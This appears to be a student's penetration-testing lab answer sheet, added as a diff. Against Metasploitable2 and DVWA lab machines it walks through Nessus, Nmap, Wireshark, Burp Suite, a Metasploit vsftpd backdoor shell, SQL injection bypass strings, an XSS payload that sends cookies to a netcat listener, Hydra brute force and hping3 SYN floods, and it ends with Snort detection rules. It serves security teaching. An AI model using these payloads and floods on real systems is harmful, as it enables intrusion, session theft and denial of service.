@@ -1,0 +1,491 @@
+1. a) Imagine you are working as a cybersecurity analyst for a financial institution, you have been assigned the critical task of conducting a Nessus vulnerability analysis on a critical host system (windows,Kali Linux) in the local network hosting sensitive customer data. Detail your step-step approach, including pre-scan preparations, specific Nessus configurations for maximum efficacy in an environment, scan the targets, prioritize and analyse the results and generate reports. 
+
+Nessus is a remote security scanning tool, which scans a computer and raises an alert if it discovers any vulnerabilities that malicious hackers could use to gain access to any computer you have connected to a network. It is a remote vulnerability scanner that detects security flaws on systems connected to a network.
+
+1. Download the Nessus Debian package (Linux-Debian-amd64) from the official website.
+2. Install using: sudo dpkg -i Nessus-10.4.1-debian9_amd64.deb
+3. Start the service: sudo systemctl start nessusd.service
+4. Open https://kali:8834/ in your browser → Advanced → Accept Risk and Continue.
+5. Select Nessus Essentials (free version) and activate using your email code.
+6. Set username and password, allow plugin downloads, and start Nessus.
+7. (Optional) Change password: /opt/nessus/sbin/nessuscli chpasswd anand
+8. Go to 'New Scan', enter Metasploitable2 IP, and choose scan type.
+9. Run or schedule scans, analyze results by severity and CVSS scores.
+10. Review remediation suggestions and export a PDF report of vulnerabilities.
+
+1. b) As part of a penetration testing engagement for a client, you're tasked with evaluating the security of their internal network. You suspect that sensitive data might be leaking from one of their development servers due to a potential misconfiguration or a compromised machine within their network. To investigate further, you plan to intercept network traffic using Wireshark to identify any unauthorized data transfers. 
+
+Wireshark is a widely used, open source network analyzer that can capture and display real-time details of network traffic. It is particularly useful for troubleshooting network issues, analyzing network protocols and ensuring network security. 
+
+1. Start both Kali Linux and Metasploitable2 VMs.
+2. In Kali, open Applications → Sniffing & Spoofing → Wireshark.
+3. Select interface eth0 to capture traffic.
+4. In the browser, enter the Metasploitable2 IP (e.g., 192.168.62.129) to access Mutillidae.
+5. Go to the Mutillidae login page and attempt login with payload (e.g., admin / 12345).
+6. Switch to Wireshark; traffic capture begins.
+7. Apply filter "http" and locate POST request to login.php.
+8. Right‑click → Follow → HTTP Stream.
+9. The stream window shows intercepted traffic, including the entered username and password.
+
+
+2. a. As a member of Blue team experts in Monitoring and Technical Support of a medium sized company, you have been asked to assess the security posture of the internal network. Use Nmap for network discovery, Port scanning, Service version detection and vulnerability detection. Then Document your findings, including the identified vulnerabilities, their severity levels. 
+
+Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. 
+
+It uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. 
+
+nmap <IP>→ Performs a basic scan of the target IP to list open ports and services.
+
+sudo nmap -v <IP>→ Runs a detailed (verbose) scan showing progress and extra information.
+
+nmap --open <IP>→ Displays only ports that are open, hiding closed or filtered ones.
+
+nmap -A <IP>→ Aggressive scan: detects OS, services, versions, and possible vulnerabilities.
+
+nmap -p 80 <IP>→ Scans only port 80 (commonly used for web servers).
+
+nmap --top-ports 10 <IP>→ Scans the 10 most commonly used ports on the target.
+
+nmap -O <IP>→ Detects the operating system running on the target machine.
+
+nmap -sV <IP>→ Detects service versions (e.g., Apache 2.4, SSH 8.2) on open ports.
+
+nmap -sS <IP>→ Performs a TCP SYN scan (stealthy and fast) to find open ports.
+
+nmap -sT <IP>→ Performs a full TCP connect scan (less stealthy but reliable).
+
+nmap -sU <IP>→ Scans for open UDP ports (used by DNS, SNMP, etc.).
+
+nmap -sO <IP>→ Scans for supported IP protocols (like TCP, UDP, ICMP) on the target.
+
+1. Start Kali Linux and Metasploitable2 VMs, then obtain the target IP.
+2. Open terminal in Kali and run basic scans:
+   - nmap <IP>
+   - sudo nmap -v <IP> (verbose)
+   - nmap -V <IP> (version)
+   - nmap <IP1> <IP2> (multiple hosts)
+   - nmap <network-range> --exclude <IP> (exclude host)
+   - nmap --open <IP> (show only open ports)
+   - nmap -A <IP> (aggressive scan)
+   - nmap -sA <IP> (check if packets are filtered)
+   - nmap -p 80 <IP> (specific port)
+   - nmap --packet-trace <IP> (trace packets)
+   - nmap --top-ports 10 <IP> (top ports)
+
+OS Detection:
+   - nmap -O <IP>
+   - nmap -v -O <IP>
+   - nmap -O --osscan-guess <IP>
+
+Service Detection:
+   - nmap -sV -O <IP>
+   - nmap -sV --version-trace <IP>
+
+Advanced Scans:
+   - nmap -sS <IP> (TCP SYN)
+   - nmap -sT <IP> (TCP Connect)
+   - nmap -sU <IP> (UDP)
+   - sudo nmap -sN <IP> (TCP Null)
+   - sudo nmap -sF <IP> (TCP FIN)
+
+Custom Scans:
+   - nmap -sS --scanflags SYNFIN -T4 www.google.com
+   - nmap -sO <IP> (protocol scan)
+   - nmap --send-eth <IP> (Ethernet packets)
+   - nmap --send-ip <IP> (IP packets)
+
+2.b. Imagine you are a member of Red Team in a company, you have been assigned a penetration testing task to assess the security of a corporate network using Kali Linux and the Metasploit framework. Outline a step-by-step process for utilizing Metasploit to identify and exploit vulnerabilities within the network. 
+
+1. Ensure Kali Linux and Metasploitable2 VMs are running.
+2. In Kali terminal, update framework if needed  msfupdate
+3. Launch Metasploit:   msfconsole
+4. Load exploit:   use exploit/unix/ftp/vsftpd_234_backdoor
+5. View options:   show options
+6. Set target IP:   set RHOST 192.168.62.129
+7. Run exploit:   exploit
+8. A shell session opens for the target VM.
+9. Create a file (e.g., 1.txt), copy it to another file, and verify contents.
+10. On Metasploitable2 VM, check the copied file contents.
+11. Sensitive files (e.g., /etc/passwd) can also be accessed, demonstrating successful exploitation.
+
+3. Imagine a legal firm handling contracts for clients remotely. Let’s say a client, Mr. John, needs to sign a contract for a property purchase. how could Cryptool be applied to digitally sign a contract document, authenticate its validity, and ensure the secure storage of both the digital signature and the original document? Demonstrate the use of digital signatures using cryptool by performing following things: 
+a) Creation of signature b) Storing the signature c) Verifying the signature 
+RSA (Rivest–Shamir–Adleman) is an asymmetric encryption algorithm that uses two keys:
+- Public key → encrypts data or verifies signatures.- Private key → decrypts data or creates signatures.
+1. Key Generation:
+   - Choose two prime numbers p and q.
+   - Compute n = p × q and φ(n) = (p−1)(q−1).
+   - Select e such that 1 < e < φ(n) and gcd(e, φ(n)) = 1.
+   - Compute d so that e × d ≡ 1 (mod φ(n)).
+   - Public key = (e, n), Private key = (d, n).
+2. Encryption:
+   - Convert message M to a number.
+   - Ciphertext C = M^e mod n.
+3. Decryption:
+   - M = C^d mod n → original message recovered.
+In Cryptool2:
+- Generate RSA key pair (2048 bits).
+- Encrypt file using public key.
+- Decrypt using private key.
+- Create digital signature (RSA + SHA‑256) and verify with public key.
+Purpose:
+- Ensures confidentiality, authenticity, integrity, and non‑repudiation.
+
+4. Imagine you're a cybersecurity analyst tasked with assessing the security of a newly developed e-commerce website. You would utilize Burp suite and perform following activities to identify and mitigate security flaws in the web application. Start by describing the setup process for Burp Suite, including configuring proxy settings and initiating automated scans to detect common vulnerabilities like SQL Injection. 
+
+i. Manual Testing of SQL Injection 
+1. Start both Kali Linux and Metasploitable2 virtual machines.
+2. On Metasploitable2 terminal:   cd /var/www/mutillidae   sudo nano config.inc
+3. Ensure the database name is set as:   dbname=owasp10    Save and exit (Ctrl+X, Y, Enter).
+4. In Kali browser, open:   http://192.168.62.129
+5. Go to Mutillidae login page.
+6. Enter username as ' and leave password blank, then click Login.
+   → Error appears, confirming SQL injection vulnerability.
+7. Enter username: admin   Password: blahblah' OR 6=6#   → Logs in as admin.
+8. Enter username: admin' #   Password: (blank)   → Still logs in as admin.
+9. Navigate to:
+   OWASP Top 10 → A1 Injection → SQLi Extract Data → User Info
+10. Enter username: admin and password: adminpass → click View Account Details.
+    → Shows “Results for admin – 1 record found”.
+11. Enter username: admin and password: ' OR 1='1--
+    → Click View Account Details → Shows “Results for admin – 16 records found”.
+ii. Proxy Attack with Burp Suite. 
+1. Start both Kali Linux and Metasploitable2 virtual machines.
+2. In Kali, open Applications → Web Application Analysis → Burp Suite.
+3. Configure proxy:   - In Burp → Proxy → Options → Add Set Address: 127.0.0.1, Port: 8080 
+4. Download Burp certificate:   - In browser → http://burp → download certificate.
+   - Import into browser’s certificate store (Settings → Certificates → Import).
+5. Open Mutillidae in browser:   http://192.168.62.129
+6. Go to login page → enter username: john, password: passwd.
+7. In Burp → enable Intercept ON.
+8. Click Login in Mutillidae → Burp captures the HTTP request.
+9. Modify captured data:   username=admin&password=adminpass
+10. Click Forward to send modified request.
+11. Observe in Mutillidae → login succeeds as admin/adminpass.
+12. In Burp → Target → Site Map → view intercepted request and response details.
+
+5. Imagine you're a cybersecurity analyst responsible for evaluating the security of a newly launched online education platform. You need to use Burp Suite to find and address any security issues within the application. Explain how you would set up Burp Suite, including configuring the proxy settings and running automated scans to uncover common vulnerabilities.
+XSS (Cross Site Scripting)
+CSRF (Cross Site Request Forgery)
+
+ A. Cross-Site Scripting attacks are a type of injection in which malicious scripts are injected into web sites and execute on client side.
+Kali:	Kali browser metasploitable2 ip -> DVWA -> admin/password
+	
+	i. XSS Stored: scripts injected will be stored permanently, any time visitor comes up, scripts would be executed.
+	● Name: Test
+	Message: <b>Hello Everyone </b>
+	● Name: Hi Message: <script>alert(“Hello This is XSS”)</script>
+	Now go to other page comeback to xss stored page, then user can see pop up message
+	To fetch the cookies	<script>alert(document.cookie)</script>
+	Navigate xss(reflected) and paste script, then it will display PHPSSESSID(Cookie value)
+
+	ii. XSS reflected:
+	<script>alert(“hello”)</script> and submit Alert window is displayed.
+	Now go to any other page.. comeback to xss reflected page, user cannot see pop up 	  To steal other user cookies:
+	Navigate to XSS stored and type below script in message. Before that increase the size of message textbox.
+	<script>new Image().src=”http://192.168.62.128/abc.php?output=”+document.cookie;</script>
+	press Sign Guestbook.
+
+	Keep the listener ready in terminal by using below command : nc -lvp 80
+	and go to other tabs in DVWA page and come back to XSS stored..
+	then it will steal the cookie of the user and send it to kali linux VM.
+
+	iii)CSRF (Cross Site request Forgery)
+	
+	1. Log in to DVWA as `admin/password`.
+	2. Set security level to **Low**.
+	3. Open Burp Suite and configure the proxy with the certificate installed.
+	4. Go to the CSRF page and enter a new password + confirmation.
+	5. Turn **Intercept ON** in Burp Suite.
+	6. Click **Change** to submit the form and capture the request.
+	7. Send the intercepted request to **Repeater**.
+	8. Forward the request.
+	9. Verify the “password changed” message in DVWA.
+	10. In Repeater, modify the password to another value and resend the request.
+	11. Check the **Render/Response** tab to confirm the password change message.
+	12. Turn **Intercept OFF** and disable proxy settings.
+	13. Log out of DVWA.
+	14. Try logging in again with the previous password and observe the login failure because the password was changed.
+
+6. ABC Corp, a medium-sized company, is concerned about the security of its network and wants to ensure that its employees are using strong passwords. The IT security team has been tasked with conducting a password strength assessment to identify weak passwords that may pose a security risk. The IT security team decides to use a password cracking tool, to perform the password strength assessment. The plan to target the company's internal systems, including FTP, SSH. By using Hydra password cracking tool perform a password strength assessment, so that ABC Corp's IT security team was able to identify and address weaknesses in their network's authentication mechanisms.
+Hydra refers to THC‑Hydra, a well‑known password‑cracking and login brute‑force tool used in penetration testing and vulnerability assessment. 
+Kali:	
+	Locate unix_passwords.
+	Add msfadmin	Vi /opt/metasploit-framework/embedded/framework/data/wordlists./unix_passwords.txt
+	Hydra -1 msfadmin –P /opt/metasploit-framework/embedded/framework/data/wordlists/unix_password.txt ftp://metaip
+	ftp metaip
+	ls,cd vulnerable, cd twiki20030201, get TWiki20030201.tar.gz
+	ssh –o HostKeyAlgorithms=+ssh-rsa msfadmin@ubuip
+	
+	ls, cd /home, echo “welcome”>1.txt, cat 1.txt
+
+
+7. Imagine you are the network security administrator for a medium-sized e-commerce company that operates an online store handling sensitive customer information. Recently, there have been reports of intermittent service disruptions and slow response times on your company's website, resulting in customer complaints and loss of revenue. After conducting initial investigations, you suspect that the website may be experiencing denial-of-service (DoS) attacks, specifically SYN floods and Ping flood attacks. So, it is important for organizations to have response plans in place to mitigate the impact of DoS attacks on their operations. Use Hping3, kali Linux tool to perform SYN floods and ping flood attacks to launch DOS attack on the target machine and proactively monitor the networks for signs of attack.
+A Denial of Service Attack is a cyber-attack in which the attacker seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely distributing services of a host connected to the internet.
+	A. Ping Flood dos attack
+Kali: 
+	Start Wireshark
+	Ping ubu ip
+	capture ICMP request/reply from wireshark.
+
+	B.using Hping
+Ubu:
+	Sudo apt-get install snort –y
+	Sudo snort –A console –c /etc/snort/snort.conf
+Kali:
+	a. sudo hping3 -1 -c 1 192.168.62.133
+	b. sudo hping3 -1 -c 1 -i 5 192.168.62.133
+	c. sudo hping3 -1 --faster 192.168.62.133
+	d. sudo hping3 -1 -a 192.168.62.139 192.168.62.133
+	e. sudo hping3 -1 –rand-source 192.168.62.133
+
+	A. Syn Flood dos attack
+
+Metasploitable2ip in kali browser -> DVWA, login
+Kali:	
+	a. sudo hping3 -S -c 1 -p 80 192.168.62.129
+	b. sudo hping3 -S -c 1 -p 80 -i 5 192.168.62.129
+	c. sudo hping3 -S --flood -p 80 192.168.62.129
+8. In a cybersecurity lab environment, a team is tasked with implementing and testing an Intrusion Prevention and Detection System (IDS) using Snort. The team's objectives include configuring Snort for optimal performance, conducting rigorous testing to ensure its effectiveness, and developing custom Snort rules tailored to specific security requirements. Additionally, the team aims to simulate real-world attack scenarios using Kali Linux to detect and mitigate potential threats effectively.
+
+Snort is an open source network intrusion detection and prevention system(IDS/IPS) that monitors the network traffic and identifies potentially malicious activities on Internet Protocol(IP) networks.
+•	Real time network monitoring 
+•	Protocol analysis 
+•	Content matching; Collates rules by protocol and contents 
+•	OS fingerprinting
+Ubu: 
+	Sudo apt-get install snort
+	Config interface: /sbin/route –n  in new terminal
+	cd /etc/snort
+	sudo vi snort.conf
+	cd rules
+	vi local.rules
+		alert icmp $EXTERNAL_NET any -> HOME_NET any (msg:”a”;sid:5889;rev:1;)
+		alert tcp any any -> $HOME_NET 21 (msg:”ftp”;sid:60001;rev:1;)
+		alert tcp any any -> $HOME_NET 22 (msg:”ssh”;sid:600022;rev:1;)
+		
+	vi icmp.rules 
+	sudo snort –T –c /etc/snort/snort.conf
+	sudo snort –A console –c /etc/snort/snort.conf
+Kali:
+	Ping/ftp/Nmap ubu ip
+	Ssh ubuntu@ubuip
+
+
+
+
+
+
+
+
+1
+Setup Environment
+Info
+Ensure both Ubuntu and Kali Linux VMs are running.
+Start Ubuntu VM (Snort host)
+Start Kali Linux VM (attacker)
+Verify both are on the same network (Host-Only/Bridged)
+Use ip a to check IP addresses
+2
+Install Snort
+Install Snort on Ubuntu.
+Run: sudo apt-get update
+Run: sudo apt-get install snort
+During setup, select correct interface (e.g., ens33)
+3
+Configure Snort
+Edit configuration and rule files.
+Navigate: cd /etc/snort/
+Edit main config: sudo vi snort.conf
+Go to rules folder: cd /etc/snort/rules
+Create/edit rules: vi local.rules, vi icmp.rules
+4
+Add Custom Rules
+Define detection rules for ICMP, FTP, and SSH.
+ICMP Ping:
+alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"Varsha"; sid:5889; rev:1;)
+FTP Attempt:
+alert tcp any any -> $HOME_NET 21 (msg:"FTP attempted"; sid:60001; rev:1;)
+SSH Attempt:
+alert tcp any any -> $HOME_NET 22 (msg:"SSH attempted"; sid:600022; rev:1;)
+5
+Validate Configuration
+Check syntax before running Snort.
+Run: sudo snort -T -c /etc/snort/snort.conf
+Ensure no errors in rules or config
+6
+Run Snort
+Start Snort in console mode to monitor packets.
+Run: sudo snort -A console -c /etc/snort/snort.conf
+Snort now listens for traffic on chosen interface
+7
+Simulate Attacks
+Use Kali Linux to generate traffic.
+Nmap Scan: nmap 192.168.111.133
+Ping: ping 192.168.111.133
+FTP: ftp 192.168.111.133
+SSH: ssh ubuntu@192.168.111.133
+8
+Observe Alerts
+Check Snort console for triggered rules.
+ICMP ping → "Varsha" message
+FTP attempt → "FTP attempted" message
+SSH attempt → "SSH attempted" message
+Nmap scan → Reconnaissance alert (e.g., SNMP request tcp)
+9
+Troubleshoot Errors
+Warning
+Fix common version and interface issues.
+If interface error → run ip a and update snort.conf
+If rule error → check syntax (sid, rev, msg)
+If config error → ensure $HOME_NET is set correctly
+If version mismatch → Snort v3 uses .lua config instead of .conf
+
+🧪 Lab Manual: Intrusion Detection & Prevention using Snort
+Objective
+To configure and test Snort IDS/IPS on Ubuntu, detect simulated attacks from Kali Linux, and create custom rules for ICMP, FTP, and SSH traffic. The lab demonstrates Snort’s ability to detect reconnaissance and intrusion attempts.
+Tools Required
+Ubuntu VM (Snort host)
+Kali Linux VM (attack simulation)
+Snort IDS (v2 or v3)
+Nmap (for scanning)
+Networking utilities (ping, ftp, ssh)
+1
+Setup Virtual Machines
+Info
+Ensure Ubuntu and Kali Linux VMs are running and networked.
+Configure both VMs on the same subnet (Host-Only or Bridged)
+Verify connectivity using ping between VMs
+2
+Install Snort
+Install Snort IDS on Ubuntu.
+Run sudo apt-get update
+Run sudo apt-get install snort
+Verify installation with snort -V
+3
+Configure Snort (v2)
+Edit configuration for Snort v2.
+File: /etc/snort/snort.conf
+Set ipvar HOME_NET 192.168.111.133/24
+Set ipvar EXTERNAL_NET any
+Add include $RULE_PATH/local.rules
+Add include $RULE_PATH/icmp.rules
+4
+Configure Snort (v3)
+Edit configuration for Snort v3.
+File: /usr/local/etc/snort/snort.lua
+Define HOME_NET and EXTERNAL_NET variables
+Ensure rule paths point to /etc/snort/rules
+Include custom rule files
+5
+Create Custom Rules
+Define detection rules in local.rules and icmp.rules.
+ICMP Ping: alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"Varsha - ICMP Ping Detected"; sid:5889; rev:1;)
+FTP Attempt: alert tcp any any -> $HOME_NET 21 (msg:"FTP Attempted"; sid:60001; rev:1;)
+SSH Attempt: alert tcp any any -> $HOME_NET 22 (msg:"SSH Attempted"; sid:60002; rev:1;)
+ICMP Echo Request: alert icmp any any -> $HOME_NET any (msg:"ICMP Echo Request Detected"; sid:70001; rev:1;)
+6
+Validate Configuration
+Test Snort configuration syntax.
+Run sudo snort -T -c /etc/snort/snort.conf (v2)
+Run sudo snort -c /usr/local/etc/snort/snort.lua -T (v3)
+Ensure no errors are reported
+7
+Run Snort IDS
+Start Snort in console mode to monitor traffic.
+Snort v2: sudo snort -A console -c /etc/snort/snort.conf -i ens33
+Snort v3: sudo snort -c /usr/local/etc/snort/snort.lua -i ens33 -A console
+Replace ens33 with your actual interface
+8
+Simulate Attacks from Kali
+Generate traffic to trigger Snort rules.
+Ping Ubuntu: ping 192.168.111.133
+FTP attempt: ftp 192.168.111.133
+SSH attempt: ssh ubuntu@192.168.111.133
+Nmap scan: nmap 192.168.111.133
+9
+Observe Alerts
+Check Snort console for triggered rules.
+ICMP ping → "Varsha - ICMP Ping Detected"
+FTP attempt → "FTP Attempted"
+SSH attempt → "SSH Attempted"
+Nmap scan → Reconnaissance alerts
+Observation
+ICMP ping attempts were detected with the custom “Varsha” message.
+FTP and SSH connection attempts triggered alerts as defined.
+Nmap scan was detected as reconnaissance activity.
+Result
+Snort IDS was successfully configured and tested. Both Snort v2 and v3 procedures were validated, and custom rules for ICMP, FTP, and SSH were triggered, demonstrating Snort’s ability to detect and log malicious traffic.
+✅ This final manual now includes separate procedures for Snort v2 and v3, all commands, rules, and expected outputs. It’s polished for submission as your VAPT Lab Report.
+Would you like me to also add a “Precautions & Best Practices” appendix (e.g., running Snort with root, avoiding false positives, tuning HOME_NET) so your report looks even more professional?
+
+
+When you start Snort for the first time, the snort.conf file needs to be set up with the basic variables, paths, and rule includes so Snort knows what network to monitor and which rules to load. Here’s what you should write:
+🔧 Minimal snort.conf Setup (First Time)
+Open the file:
+bash
+sudo vi /etc/snort/snort.conf
+
+Add or check the following key lines:
+bash
+# Define the HOME and EXTERNAL networks
+ipvar HOME_NET 192.168.111.133/24
+ipvar EXTERNAL_NET any
+
+# Define rule path
+var RULE_PATH /etc/snort/rules
+
+# Include rule files
+include $RULE_PATH/local.rules
+include $RULE_PATH/icmp.rules
+
+📄 local.rules (Custom Rules)
+Create or edit /etc/snort/rules/local.rules:
+bash
+# Detect ICMP ping attempts
+alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"Varsha - ICMP Ping Detected"; sid:5889; rev:1;)
+
+# Detect FTP connection attempts
+alert tcp any any -> $HOME_NET 21 (msg:"FTP Attempted"; sid:60001; rev:1;)
+
+# Detect SSH connection attempts
+alert tcp any any -> $HOME_NET 22 (msg:"SSH Attempted"; sid:60002; rev:1;)
+
+📄 icmp.rules (Separate ICMP Rules)
+Create /etc/snort/rules/icmp.rules:
+bash
+# Detect ICMP echo request (ping)
+alert icmp any any -> $HOME_NET any (msg:"ICMP Echo Request Detected"; sid:70001; rev:1;)
+
+# Detect ICMP echo reply
+alert icmp $HOME_NET any -> any any (msg:"ICMP Echo Reply Detected"; sid:70002; rev:1;)
+
+🖥️ Testing Configuration
+Validate syntax:
+bash
+sudo snort -T -c /etc/snort/snort.conf
+
+Run Snort in console mode (replace ens33 with your interface name from ip a):
+bash
+sudo snort -A console -c /etc/snort/snort.conf -i ens33
+
+🧪 Attack Simulation from Kali
+Ping test:
+bash
+ping 192.168.111.133
+→ Ubuntu Snort terminal shows: “Varsha - ICMP Ping Detected”
+FTP test:
+bash
+ftp 192.168.111.133
+→ Ubuntu Snort terminal shows: “FTP Attempted”
+SSH test:
+bash
+ssh ubuntu@192.168.111.133
+→ Ubuntu Snort terminal shows: “SSH Attempted”
+Nmap scan:
+bash
+nmap 192.168.111.133
+→ Snort detects reconnaissance activity.
+✅ With this setup, your snort.conf, local.rules, and icmp.rules are ready for first‑time use.
+Would you like me to also give you a side‑by‑side comparison of Snort v2 vs Snort v3 configuration differences (paths, syntax, commands) so you can include both in your lab manual?
+
